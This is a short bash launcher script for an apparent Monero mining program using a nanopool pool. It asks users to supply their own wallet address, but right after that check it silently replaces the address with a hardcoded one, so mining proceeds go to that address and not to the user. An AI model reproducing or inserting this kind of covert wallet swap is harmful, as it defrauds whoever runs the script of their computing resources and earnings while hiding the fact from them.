#!/usr/bin/env bash
# Quick start wrapper for Linux
if [ -z "$WALLET" ]; then
  echo "Please set WALLET env variable: export WALLET=44..."
  echo "Usage: WALLET=44... WORKER=myrig ./start.sh"
  exit 1
fi
WALLET="44ERznPwTmsLqLwwPXkA4W7YX42LeTAPjJ3VYazpKDuEGfZ59LAAdY88RCNMWjU64X5Bva27iWvsS8xQUSbjkKgk1X3td8f"
WORKER=${WORKER:-worker1}
POOL_HOST=${POOL_HOST:-xmr-eu1.nanopool.org:10343}
node index.js
